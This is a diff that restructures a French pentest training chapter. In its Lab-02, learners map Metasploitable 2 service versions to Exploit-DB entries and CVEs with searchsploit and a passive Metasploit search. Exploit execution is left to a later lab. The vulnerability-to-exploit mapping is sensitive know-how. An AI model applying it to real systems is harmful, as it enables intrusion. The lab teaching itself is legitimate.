@@ -143,7 +143,7 @@ Test : `prouve_strict preuves/test/echec-strict.txt commande_inexistante; echo "
 
 ## 3. Présentation du framework MITRE ATT&CK
 
-> **Convention de lecture** — Chaque acronyme est développé à sa première occurrence avec son nom complet en anglais entre parenthèses, puis repris dans le glossaire en fin de chapitre (section 13).
+> **Convention de lecture** — Chaque acronyme est développé à sa première occurrence avec son nom complet en anglais entre parenthèses, puis repris dans le glossaire en fin de chapitre (section 15).
 
 ### 3.1 Qu'est-ce que MITRE ATT&CK ?
 
@@ -441,7 +441,7 @@ Les outils sont présentés ici **avant** leur mise en place. Ils seront utilis�
 - **script / tcpdump** : journalisation de session terminal et capture réseau de référence.
 - **MITRE ATT&CK Navigator** : outil de visualisation de la matrice ATT&CK et de création de couches JSON.
 
-## 6. Lab-01 — Découverte réseau et empreinte de la cible
+## Lab-01 — Découverte réseau et empreinte de la cible
 
 ### 6.1 Contexte et objectif
 
@@ -800,15 +800,16 @@ Résultat attendu : un `# rc=` par fichier, puis une liste de 32 à 64 caractèr
 - [ ] Le fallback `-sT` est démontré.
 - [ ] Toutes les preuves contiennent `# date:`, `# cmd:` et `# rc=`.
 
-## 7. Lab-02 — Recherche de vulnérabilités connues hors ligne
+## Lab-02 — Recherche de vulnérabilités connues hors ligne
 
-### 7.1 Contexte et objectif
+### Énoncé / Contexte
 
 Le Lab-01 a produit une empreinte de Metasploitable 2. Ce lab transforme cette empreinte en **candidats de vulnérabilités** à l'aide de la base **Exploit-DB** copiée localement sur Kali. Aucune requête Internet n'est nécessaire : la recherche est passive, et tous les exploits sont exécutés dans le lab sans limitation (Lab-07).
 
 **Place dans la chaîne** — après l'empreinte (Lab-01), avant la construction du plan maître (Lab-03). Ce lab qualifie des candidats, il ne les exploite pas.
 
-À la fin de ce lab, vous devez être capable de :
+**Objectifs pédagogiques** — à la fin de ce lab, vous devez être capable de :
+
 - distinguer une recherche large d'une recherche stricte (`-s`, `-t`, `-e`) ;
 - rechercher par CVE avec `--cve` et retrouver le chemin local d'un exploit avec `-p` ;
 - vérifier qu'une version observée appartient bien à la plage de versions d'un titre d'exploit ;
@@ -817,19 +818,7 @@ Le Lab-01 a produit une empreinte de Metasploitable 2. Ce lab transforme cette e
 - utiliser `msfconsole search` en mode **passif**, sans `use`, `exploit` ou `run` ;
 - documenter un candidat comme `validé`, `rejeté` ou `non vérifiable`.
 
-> **Périmètre du lab** — ce lab ne fait que rechercher ; tous les exploits sont développés, exécutés et testés dans le lab sans limitation (Lab-07). Les commandes `searchsploit -m`, `searchsploit -x`, `msfconsole use`, `msfconsole exploit` et `msfconsole run` sont réservées au Lab-07.
-
-**Outils et commandes utilisées**
-
-| Outil | Commandes | Rôle |
-|---|---|---|
-| `searchsploit` | `-h`, `-s -t`, `--cve`, `--nmap`, `-p`, `-j`, `--disable-colour` | Recherche locale Exploit-DB |
-| `msfconsole` | `msfconsole -q -x 'search vsftpd; exit'` | Recherche passive de modules |
-| `prouve` | `prouve preuves/ch1-lab2/... commande` | Preuve datée avec code retour |
-| `grep` | `grep -E 'Exploit Title|CVE-'` | Extraction et comptage des résultats |
-| `sha256sum` | `sha256sum preuves/ch1-lab2/*` | Intégrité des preuves |
-
-### 7.2 Plan MITRE ATT&CK
+**Plan MITRE ATT&CK**
 
 | Élément | Valeur |
 |---|---|
@@ -840,7 +829,7 @@ Le Lab-01 a produit une empreinte de Metasploitable 2. Ce lab transforme cette e
 | Contrôle défensif | Gestion des vulnérabilités, inventaire logiciel, limitation des bases d'exploits |
 | Détection | Requêtes massives dans Exploit-DB, recherche de CVE sur un poste d'administration |
 
-### 7.3 Prérequis
+**Prérequis**
 
 - Empreinte du Lab-01 : versions vsftpd `2.3.4`, Samba `3.0.20-Debian`, UnrealIRCd `3.2.8.1`, distccd `v1`, ProFTPD `1.3.1`, MySQL `5.0.51a-3ubuntu5`, PostgreSQL `8.3.0 - 8.3.7`, Apache `2.2.8`, PHP `5.2.4`.
 - `searchsploit` installé et base locale à jour au moment de la formation. Vérifiez avec `searchsploit -h`.
@@ -848,37 +837,101 @@ Le Lab-01 a produit une empreinte de Metasploitable 2. Ce lab transforme cette e
 - Le fichier XML du Lab-01 : `preuves/ch1-lab1/nmap-versions.xml`. Si vous ne l'avez pas, regénérez-le avec `nmap -sV -oX`.
 - Répertoire de travail : `preuves/ch1-lab2/`.
 
-### 7.4 Étapes
+> **Périmètre du lab** — ce lab ne fait que rechercher ; tous les exploits sont développés, exécutés et testés dans le lab sans limitation (Lab-07). Les commandes `searchsploit -m`, `searchsploit -x`, `msfconsole use`, `msfconsole exploit` et `msfconsole run` sont réservées au Lab-07.
 
-**Étape 1** — Vérifier la base locale et les options.
+### Outils et commandes utilisées
+
+| Outil | Commande | Rôle |
+|---|---|---|
+| `searchsploit` | `-h`, `-s -t`, `--cve`, `--nmap`, `-p`, `-j`, `--disable-colour` | Recherche locale Exploit-DB |
+| `msfconsole` | `msfconsole -q -x 'search vsftpd; exit'` | Recherche passive de modules |
+| `prouve` | `prouve preuves/ch1-lab2/... commande` | Preuve datée avec code retour |
+| `grep` | `grep -E 'Exploit Title|CVE-'` | Extraction et comptage des résultats |
+| `sha256sum` | `sha256sum preuves/ch1-lab2/*` | Intégrité des preuves |
+
+### Commande et laboratoire étape par étape
+
+#### Étape 1 — Vérifier la base locale et les options
+
+**But** — confirmer que `searchsploit` est installé, que la base Exploit-DB locale répond et que les options utilisées dans le lab sont disponibles.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — `searchsploit` installé avec sa base locale ; fonction `prouve` chargée.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 prouve preuves/ch1-lab2/searchsploit-help.txt searchsploit -h
 ```
 
-Résultat attendu : l'aide s'affiche, avec les options `-s`, `-t`, `-e`, `--cve`, `--nmap`, `-p`, `-j` et `--disable-colour`. `searchsploit -h` retourne `rc=2` : l'aide est écrite sur `stderr`, ce n'est pas une erreur bloquante.
+**Explication de la commande**
 
-**Explication de la commande** — `searchsploit -h` écrit l'aide sur `stderr` et retourne `2`. C'est une convention de l'outil, pas un échec. Les options utiles sont `-s` (strict), `-t` (titre), `-e` (exact), `--cve`, `--nmap`, `-p`, `-j` et `--disable-colour`. Sans `--disable-colour`, les preuves contiennent des séquences ANSI difficiles à lire.
+- `prouve preuves/ch1-lab2/searchsploit-help.txt` : exécute la commande et écrit dans la preuve l'horodatage, la commande, `stdout`, `stderr` et le code retour.
+- `searchsploit` : interroge la copie locale de la base Exploit-DB, sans accès Internet.
+- `-h` : affiche l'aide et la liste des options.
+- `rc=2` : code retour attendu de l'aide ; `searchsploit` écrit l'aide sur `stderr`, ce n'est pas un échec bloquant.
+- `--disable-colour` : option à utiliser dans les preuves pour supprimer les séquences ANSI ; sans elle, les fichiers sont difficiles à lire.
+- Piège courant : interpréter `rc=2` comme une base absente ou cassée ; lisez le contenu de la preuve avant de conclure.
 
-**Étape 2** — Comparer recherche large et recherche stricte.
+**Résultat attendu**
+
+L'aide s'affiche, avec les options `-s`, `-t`, `-e`, `--cve`, `--nmap`, `-p`, `-j` et `--disable-colour`.
+
+**Preuve** — `preuves/ch1-lab2/searchsploit-help.txt`.
+
+#### Étape 2 — Comparer recherche large et recherche stricte
+
+**But** — mesurer la différence entre une recherche par mots-clés et une recherche limitée au titre, sur le cas vsftpd `2.3.4`.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — étape 1 terminée ; base Exploit-DB locale disponible.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 prouve preuves/ch1-lab2/searchsploit-vsftpd.txt searchsploit --disable-colour vsftpd 2.3.4
 prouve preuves/ch1-lab2/searchsploit-vsftpd-strict.txt searchsploit --disable-colour -s -t vsftpd 2.3.4
 ```
 
-Résultat attendu (extrait réel) :
+**Explication de la commande**
+
+- `prouve ... searchsploit-vsftpd.txt` : enregistre la recherche large dans une preuve datée.
+- `prouve ... searchsploit-vsftpd-strict.txt` : enregistre la recherche stricte dans une seconde preuve.
+- `searchsploit` : interroge la base locale.
+- `--disable-colour` : supprime les séquences ANSI de la sortie.
+- `vsftpd 2.3.4` : termes de recherche ; la base compare les mots du titre et de la description.
+- `-s` : recherche stricte, qui exige que tous les termes correspondent.
+- `-t` : limite la recherche au titre de l'exploit.
+- Piège courant : conclure à l'absence de vulnérabilité sur un seul `No Results` ; la recherche stricte peut manquer un titre qui contient une plage de versions, comme ProFTPD à l'étape 6.
+
+**Résultat attendu**
 
 ```text
 vsftpd 2.3.4 - Backdoor Command Execution     | unix/remote/49757.py
 vsftpd 2.3.4 - Backdoor Command Execution (Me | unix/remote/17491.rb
 ```
 
-La recherche stricte retourne ici les mêmes résultats. Sur d'autres versions, elle peut renvoyer `No Results` lorsque le titre contient une plage de versions (voir ProFTPD à l'étape 6). Ce n'est pas une absence de vulnérabilité : c'est une différence de moteur de recherche.
+La recherche stricte retourne ici les mêmes résultats. Sur d'autres versions, elle peut renvoyer `No Results` lorsque le titre contient une plage de versions. Ce n'est pas une absence de vulnérabilité : c'est une différence de moteur de recherche.
 
-**Explication de la commande** — La recherche large `vsftpd 2.3.4` retourne deux exploits. La recherche stricte retourne les mêmes résultats ici, car le titre contient la version exacte. Sur ProFTPD `1.3.1` (étape 6), la recherche stricte ne retourne rien alors que la CVE existe pour d'autres versions : ne concluez jamais sur un seul `No Results`.
+**Preuve** — `preuves/ch1-lab2/searchsploit-vsftpd.txt` et `preuves/ch1-lab2/searchsploit-vsftpd-strict.txt`.
 
-**Étape 3** — Rechercher les CVE candidates.
+#### Étape 3 — Rechercher les CVE candidates
+
+**But** — relier chaque service observé à une CVE présente dans la base locale, sans dépendre du titre de l'exploit.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — empreinte du Lab-01 ; quatre CVE candidates identifiées.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 prouve preuves/ch1-lab2/searchsploit-cve-2011-2523.txt searchsploit --disable-colour --cve 2011-2523
@@ -887,7 +940,16 @@ prouve preuves/ch1-lab2/searchsploit-cve-2010-2075.txt searchsploit --disable-co
 prouve preuves/ch1-lab2/searchsploit-cve-2004-2687.txt searchsploit --disable-colour --cve 2004-2687
 ```
 
-Résultats attendus :
+**Explication de la commande**
+
+- `prouve ... searchsploit-cve-<année>-<numéro>.txt` : crée une preuve par CVE, avec date, commande, sortie et code retour.
+- `searchsploit` : interroge la base locale.
+- `--disable-colour` : sortie sans séquences ANSI.
+- `--cve 2011-2523` : recherche le code CVE dans les métadonnées de la base, et non dans le titre.
+- Les trois autres commandes appliquent la même méthode à `CVE-2007-2447`, `CVE-2010-2075` et `CVE-2004-2687`.
+- Piège courant : rechercher uniquement le nom du service ; un même service peut correspondre à plusieurs CVE et le titre de l'exploit peut ne pas contenir le code CVE.
+
+**Résultat attendu**
 
 | CVE | Service observé | Exploit local | Statut |
 |---|---|---|---|
@@ -896,9 +958,19 @@ Résultats attendus :
 | CVE-2010-2075 | UnrealIRCd 3.2.8.1 | `linux/remote/16922.rb`, `linux/remote/13853.pl` | validé |
 | CVE-2004-2687 | distccd v1 | `multiple/remote/9915.rb` | validé |
 
-**Explication de la commande** — Les quatre CVE sont présentes dans la base locale. `--cve` cherche le code CVE dans les métadonnées, pas dans le titre. C'est la méthode la plus fiable pour relier un service à une CVE.
+**Preuve** — `preuves/ch1-lab2/searchsploit-cve-2011-2523.txt`, `searchsploit-cve-2007-2447.txt`, `searchsploit-cve-2010-2075.txt` et `searchsploit-cve-2004-2687.txt`.
 
-**Étape 4** — Lire les métadonnées d'un exploit.
+#### Étape 4 — Lire les métadonnées d'un exploit
+
+**But** — vérifier le chemin local, l'URL, les codes CVE et l'état de vérification des quatre exploits principaux.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — EDB-ID `16320`, `16922`, `17491` et `9915` identifiés à l'étape 3.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 prouve preuves/ch1-lab2/searchsploit-p-16320.txt searchsploit --disable-colour -p 16320
@@ -907,7 +979,19 @@ prouve preuves/ch1-lab2/searchsploit-p-17491.txt searchsploit --disable-colour -
 prouve preuves/ch1-lab2/searchsploit-p-9915.txt searchsploit --disable-colour -p 9915
 ```
 
-Résultat attendu (extrait réel pour `16320`) :
+**Explication de la commande**
+
+- `prouve ... searchsploit-p-<id>.txt` : enregistre les métadonnées de l'exploit dans une preuve datée.
+- `searchsploit` : interroge la base locale.
+- `--disable-colour` : sortie sans séquences ANSI.
+- `-p 16320` : affiche les métadonnées de l'exploit `16320`, notamment son chemin local, son URL et ses codes.
+- Les trois autres commandes font de même pour `16922`, `17491` et `9915`.
+- `Path` : chemin local du fichier, lisible sans Internet.
+- `Codes` : CVE et OSVDB associés à l'exploit.
+- `Verified: True` : l'équipe Exploit-DB a vérifié l'exploit ; cela ne garantit pas qu'il fonctionne sur cette cible.
+- Piège courant : copier l'exploit avec `-m` ou l'ouvrir avec `-x` ; ces options sont réservées au Lab-07.
+
+**Résultat attendu**
 
 ```text
   Exploit: Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)
@@ -920,9 +1004,19 @@ File Type: Ruby script, ASCII text
 
 `Verified: True` signifie que l'équipe Exploit-DB a vérifié l'exploit. Cela ne garantit pas qu'il fonctionne sur votre cible : la version et la configuration doivent correspondre.
 
-**Explication de la commande** — `-p` affiche le chemin local, l'URL, les codes CVE/OSVDB et `Verified`. Le chemin local permet de lire l'exploit sans Internet. Ne copiez pas l'exploit dans le répertoire de travail : `-m` est hors périmètre.
+**Preuve** — `preuves/ch1-lab2/searchsploit-p-16320.txt`, `searchsploit-p-16922.txt`, `searchsploit-p-17491.txt` et `searchsploit-p-9915.txt`.
 
-**Étape 5** — Rechercher par service et version.
+#### Étape 5 — Rechercher par service et version
+
+**But** — balayer les services observés au Lab-01 et repérer les candidats dont le titre contient une version ou une plage exploitable.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — versions du Lab-01 ; base locale disponible.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 prouve preuves/ch1-lab2/searchsploit-samba.txt searchsploit --disable-colour samba 3.0.20
@@ -937,7 +1031,17 @@ prouve preuves/ch1-lab2/searchsploit-tomcat.txt searchsploit --disable-colour to
 prouve preuves/ch1-lab2/searchsploit-bind.txt searchsploit --disable-colour bind 9.4.2
 ```
 
-Résultats attendus (extraits réels) :
+**Explication de la commande**
+
+- `prouve ... searchsploit-<service>.txt` : enregistre chaque recherche dans une preuve distincte.
+- `searchsploit` : interroge la base locale.
+- `--disable-colour` : supprime les séquences ANSI.
+- `samba 3.0.20` : recherche large sur le service et la version ; elle retourne aussi des titres qui ne s'appliquent pas à cette version.
+- `unrealircd 3.2.8` et `distcc` : recherches sur les services identifiés au Lab-01.
+- `proftpd 1.3.1`, `mysql 5.0.51`, `postgresql 8.3`, `apache 2.2.8`, `php 5.2.4`, `tomcat 5.5` et `bind 9.4.2` : recherches sur les autres services exposés.
+- Piège courant : recopier tous les résultats dans la matrice sans lire la plage de versions ; `7701` (`Samba < 3.0.20`) et `36741` (DoS) ne s'appliquent pas à `3.0.20`.
+
+**Résultat attendu**
 
 ```text
 Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution | unix/remote/16320.rb
@@ -949,35 +1053,75 @@ UnrealIRCd 3.2.8.1 - Remote Downloader/Executor                      | linux/rem
 DistCC Daemon - Command Execution                                   | multiple/remote/9915.rb
 ```
 
-Pour ProFTPD `1.3.1`, la recherche ne renvoie aucun résultat direct. Pour Apache `2.2.8`, les résultats concernent surtout le module PHP CGI (`CVE-2012-1823`), pas Apache seul. Pour BIND `9.4.2`, le résultat `BIND 9.4.1 < 9.4.2` **exclut** la version `9.4.2` : le candidat doit être rejeté.
+Pour ProFTPD `1.3.1`, la recherche ne renvoie aucun résultat direct. Pour Apache `2.2.8`, les résultats concernent surtout le module PHP CGI (`CVE-2012-1823`), pas Apache seul. Pour BIND `9.4.2`, le résultat `BIND 9.4.1 < 9.4.2` **exclut** la version `9.4.2` : le candidat doit être rejeté. Samba `3.0.20` retourne quatre résultats ; `16320` est le candidat principal, `7701` et `36741` sont des faux positifs pour cette version.
 
-**Explication de la commande** — Samba `3.0.20` retourne quatre résultats. Deux sont des faux positifs pour cette version : `7701` (`Samba < 3.0.20`) et `36741` (DoS). `16320` est le candidat principal. UnrealIRCd `3.2.8.1` retourne `16922` et `13853`, tous deux dans la plage. distcc retourne `9915`. ProFTPD `1.3.1` ne retourne rien de direct : c'est le point de départ de l'étape 6.
+**Preuve** — `preuves/ch1-lab2/searchsploit-samba.txt`, `searchsploit-unrealircd.txt`, `searchsploit-distcc.txt`, `searchsploit-proftpd.txt`, `searchsploit-mysql.txt`, `searchsploit-postgresql.txt`, `searchsploit-apache.txt`, `searchsploit-php.txt`, `searchsploit-tomcat.txt` et `searchsploit-bind.txt`.
 
-**Étape 6** — Vérifier une plage de versions et rejeter un faux positif.
+#### Étape 6 — Vérifier une plage de versions et rejeter un faux positif
+
+**But** — comparer la version observée à la plage du titre et rejeter explicitement un candidat hors plage.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — ProFTPD `1.3.1` identifié au Lab-01 ; résultat de l'étape 5.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 prouve preuves/ch1-lab2/searchsploit-cve-2010-4221.txt searchsploit --disable-colour --cve 2010-4221
 ```
 
-Résultat attendu (extrait réel) :
+**Explication de la commande**
+
+- `prouve ... searchsploit-cve-2010-4221.txt` : enregistre la recherche et son code retour.
+- `searchsploit` : interroge la base locale.
+- `--disable-colour` : sortie sans séquences ANSI.
+- `--cve 2010-4221` : recherche la CVE dans les métadonnées.
+- `1.3.2 rc3 < 1.3.3b` : plage du titre ; la cible `1.3.1` est antérieure, donc hors plage.
+- Piège courant : voir « ProFTPD » et « CVE » dans le même résultat, puis conclure à une vulnérabilité sans lire la plage. La même logique s'applique à BIND : `9.4.1 < 9.4.2` exclut `9.4.2`.
+
+**Résultat attendu**
 
 ```text
 ProFTPd 1.3.2 rc3 < 1.3.3b (FreeBSD) - Telnet IAC Buffer Overflow | linux/remote/16878.rb
 ProFTPd 1.3.2 rc3 < 1.3.3b (Linux) - Telnet IAC Buffer Overflow   | linux/remote/16851.rb
 ```
 
-La cible expose ProFTPD `1.3.1`. La plage du titre commence à `1.3.2 rc3`. `1.3.1` est **antérieur** à `1.3.2 rc3` : le candidat est **rejeté** pour cette version. Piège courant : voir « ProFTPD » et « CVE » dans le même résultat, puis conclure à une vulnérabilité sans lire la plage.
+La cible expose ProFTPD `1.3.1`. La plage du titre commence à `1.3.2 rc3`. `1.3.1` est **antérieur** à `1.3.2 rc3` : le candidat est **rejeté** pour cette version.
 
-**Explication de la commande** — CVE-2010-4221 concerne `ProFTPd 1.3.2 rc3 < 1.3.3b`. La cible est `1.3.1`. Le candidat est rejeté. Le piège est de lire « ProFTPD » et de conclure ; il faut lire la plage. Même logique pour BIND : `9.4.1 < 9.4.2` exclut `9.4.2`, donc `6122` est rejeté.
+**Preuve** — `preuves/ch1-lab2/searchsploit-cve-2010-4221.txt`.
 
-**Étape 7** — Croiser automatiquement un XML Nmap avec la base.
+#### Étape 7 — Croiser automatiquement un XML Nmap avec la base
+
+**But** — générer automatiquement une requête par produit détecté par Nmap et repérer les faux positifs produits par ce mode.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — XML du Lab-01 : `preuves/ch1-lab1/nmap-versions.xml`.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 prouve preuves/ch1-lab2/searchsploit-nmap.txt \
   searchsploit --disable-colour --nmap preuves/ch1-lab1/nmap-versions.xml
 ```
 
-Résultat attendu : SearchSploit lit le XML, ignore les termes trop généraux (`ftp`), puis affiche des blocs `searchsploit -t ...` avec les résultats. Exemple réel :
+**Explication de la commande**
+
+- `prouve preuves/ch1-lab2/searchsploit-nmap.txt` : enregistre la sortie complète dans une preuve.
+- `searchsploit` : interroge la base locale.
+- `--disable-colour` : sortie sans séquences ANSI.
+- `--nmap preuves/ch1-lab1/nmap-versions.xml` : lit le XML Nmap et transforme chaque produit et version en requête `searchsploit -t`.
+- `Skipping term: ftp` : exemple de terme trop général ignoré par le mode XML.
+- Piège courant : considérer le mode XML comme une validation ; il ne compare pas les plages de versions et produit des faux positifs.
+
+**Résultat attendu**
+
+SearchSploit lit le XML, ignore les termes trop généraux (`ftp`), puis affiche des blocs `searchsploit -t ...` avec les résultats. Exemple réel :
 
 ```text
 [i] SearchSploit's XML mode (without verbose enabled). To enable: searchsploit -v --xml...
@@ -989,15 +1133,35 @@ vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/49757.py
 
 Le mode XML est un **point de départ** : il ne vérifie pas les plages de versions. Chaque candidat doit être validé manuellement.
 
-**Explication de la commande** — `--nmap` transforme chaque produit/version du XML en requête `searchsploit -t`. Il ignore les termes génériques comme `ftp`. La sortie est longue et contient des faux positifs. Le mode XML ne remplace pas la validation manuelle des plages.
+**Preuve** — `preuves/ch1-lab2/searchsploit-nmap.txt`.
 
-**Étape 8** — Recherche Metasploit passive.
+#### Étape 8 — Recherche Metasploit passive
+
+**But** — retrouver les modules Metasploit correspondant à vsftpd sans charger ni exécuter un module.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — `msfconsole` installé ; base Metasploit initialisée.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 prouve preuves/ch1-lab2/msf-search-vsftpd.txt bash -c "timeout 90 msfconsole -q -x 'search vsftpd; exit'"
 ```
 
-Résultat attendu (extrait réel) :
+**Explication de la commande**
+
+- `prouve ... msf-search-vsftpd.txt` : enregistre la sortie et le code retour.
+- `bash -c "..."` : exécute la chaîne dans un shell enfant, nécessaire pour `timeout` et les quotes internes.
+- `timeout 90` : borne l'exécution à 90 secondes.
+- `msfconsole -q` : démarre Metasploit en mode silencieux, sans bannière.
+- `-x 'search vsftpd; exit'` : exécute la recherche puis quitte immédiatement.
+- `search vsftpd` : commande passive qui liste les modules ; elle ne charge pas le module.
+- Piège courant : enchaîner avec `use`, `set`, `exploit` ou `run` ; ces commandes sont réservées au Lab-07. Le module `auxiliary/dos` est un déni de service et reste hors périmètre.
+
+**Résultat attendu**
 
 ```text
 Matching Modules
@@ -1008,16 +1172,36 @@ Matching Modules
 
 La commande `search` ne charge pas le module. Dans **ce lab**, elle ne doit jamais être suivie de `use`, `set`, `exploit` ou `run` : l'exploitation est traitée séparément dans Lab-07. Le module `auxiliary/dos` est une attaque par déni de service : il reste hors périmètre.
 
-**Explication de la commande** — `msfconsole -q -x 'search vsftpd; exit'` retourne quatre modules, dont un module `auxiliary/dos` et un module `exploit`. Le module `exploit` est un candidat, pas une preuve. La commande `search` est passive ; dans **ce lab**, `use` et `run` sont interdits. Lab-07 les utilise plus tard, après validation de la matrice de risques.
+**Preuve** — `preuves/ch1-lab2/msf-search-vsftpd.txt`.
 
-**Étape 9** — Corriger un exemple d'EDB-ID.
+#### Étape 9 — Corriger un exemple d'EDB-ID
+
+**But** — vérifier un identifiant d'exploit cité en exemple et le remplacer par l'identifiant correct du noyau Linux.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — base Exploit-DB locale ; version du noyau de Metasploitable 2 lue au Lab-04.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 prouve preuves/ch1-lab2/searchsploit-exemple-50910.txt searchsploit --disable-colour -p 50910
 prouve preuves/ch1-lab2/searchsploit-p-5092.txt searchsploit --disable-colour -p 5092
 ```
 
-Résultat attendu (extrait réel) :
+**Explication de la commande**
+
+- `prouve ... searchsploit-exemple-50910.txt` : enregistre la vérification de l'identifiant cité en exemple.
+- `prouve ... searchsploit-p-5092.txt` : enregistre la vérification de l'identifiant corrigé.
+- `searchsploit` : interroge la base locale.
+- `--disable-colour` : sortie sans séquences ANSI.
+- `-p 50910` : affiche les métadonnées de l'exploit `50910`.
+- `-p 5092` : affiche les métadonnées de l'exploit `5092`.
+- Piège courant : confondre un identifiant de CMS avec un exploit de noyau ; lisez le titre et les codes CVE.
+
+**Résultat attendu**
 
 ```text
 50910 : e107 CMS v3.2.1 - Multiple Vulnerabilities
@@ -1028,16 +1212,36 @@ Résultat attendu (extrait réel) :
 
 L'exemple `50910` est un CMS, pas un noyau Linux. L'EDB-ID correct pour l'exemple noyau est `5092`. La version de Metasploitable 2 lue au Lab-04 (`2.6.24-16-server`) est dans la plage du titre, mais l'exploitabilité réelle n'est pas testée dans ce chapitre.
 
-**Explication de la commande** — `50910` est un CMS e107, pas un noyau. `5092` est le `vmsplice` pour `2.6.17 < 2.6.24.1`, avec CVE-2008-0600, CVE-2008-0010 et CVE-2008-0009. C'est l'exemple correct. La version `2.6.24-16-server` de Metasploitable 2 est dans la plage du titre, mais l'exploitabilité n'est pas testée.
+**Preuve** — `preuves/ch1-lab2/searchsploit-exemple-50910.txt` et `preuves/ch1-lab2/searchsploit-p-5092.txt`.
 
-**Étape 10** — Vérifier la base pour le noyau de Kali.
+#### Étape 10 — Vérifier la base pour le noyau de Kali
+
+**But** — comparer le résultat de la base locale sur un noyau récent et sur le noyau de Metasploitable 2, et interpréter correctement `No Results`.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — version du noyau Kali et version `2.6.24` de la cible connues.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 ```bash
 prouve preuves/ch1-lab2/searchsploit-kernel-kali.txt searchsploit --disable-colour linux kernel 7.1.5+kali-amd64
 prouve preuves/ch1-lab2/searchsploit-kernel-2624.txt searchsploit --disable-colour linux kernel 2.6.24
 ```
 
-Résultat attendu :
+**Explication de la commande**
+
+- `prouve ... searchsploit-kernel-kali.txt` : enregistre la recherche sur le noyau de Kali.
+- `prouve ... searchsploit-kernel-2624.txt` : enregistre la recherche sur le noyau `2.6.24`.
+- `searchsploit` : interroge la base locale.
+- `--disable-colour` : sortie sans séquences ANSI.
+- `linux kernel 7.1.5+kali-amd64` : version récente du noyau Kali.
+- `linux kernel 2.6.24` : version présente dans la plage de plusieurs exploits locaux.
+- Piège courant : lire `No Results` comme « aucune vulnérabilité » ; la base locale est datée et n'est pas exhaustive.
+
+**Résultat attendu**
 
 ```text
 # noyau Kali 7.1.5
@@ -1051,9 +1255,19 @@ Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' ...                                 | li
 
 `No Results` pour Kali ne signifie pas « Kali invulnérable ». La base Exploit-DB est datée et ne couvre pas toutes les versions récentes. La conclusion correcte est « aucun résultat local pour cette version », pas « aucune vulnérabilité ».
 
-**Explication de la commande** — `No Results` pour Kali `7.1.5` montre que la base locale n'est pas exhaustive. La conclusion correcte est « aucun résultat local », pas « aucune vulnérabilité ». Pour un noyau récent, utilisez les avis du fournisseur et un scanner de vulnérabilités adapté, hors périmètre de ce chapitre.
+**Preuve** — `preuves/ch1-lab2/searchsploit-kernel-kali.txt` et `preuves/ch1-lab2/searchsploit-kernel-2624.txt`.
 
-**Étape 11** — Section web optionnelle.
+#### Étape 11 — Compléter l'empreinte web, sans exécution
+
+**But** — qualifier trois CVE web supplémentaires sans lancer d'exploit : une attaque de disponibilité, un candidat conditionnel et une validation de version.
+
+**Machine** — Kali `192.168.56.101`.
+
+**Prérequis** — empreinte web du Lab-01 ; base locale disponible.
+
+> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`
+
+**Exemple de commande**
 
 Si vous disposez de plus de temps, complétez l'empreinte web sans exécuter d'exploit :
 
@@ -1063,24 +1277,60 @@ prouve preuves/ch1-lab2/searchsploit-cve-2012-1823.txt searchsploit --disable-co
 prouve preuves/ch1-lab2/searchsploit-cve-2008-0166.txt searchsploit --disable-colour --cve 2008-0166
 ```
 
-Résultat attendu :
+**Explication de la commande**
+
+- `prouve ... searchsploit-cve-2011-3192.txt` : enregistre la recherche de la CVE Apache.
+- `prouve ... searchsploit-cve-2012-1823.txt` : enregistre la recherche de la CVE PHP CGI.
+- `prouve ... searchsploit-cve-2008-0166.txt` : enregistre la recherche de la CVE OpenSSL.
+- `searchsploit` : interroge la base locale.
+- `--disable-colour` : sortie sans séquences ANSI.
+- `--cve` : recherche le code CVE dans les métadonnées.
+- Piège courant : exécuter l'exploit DoS ou considérer la CVE PHP CGI comme validée alors que `/cgi-bin/` renvoie `403`.
+
+**Résultat attendu**
 
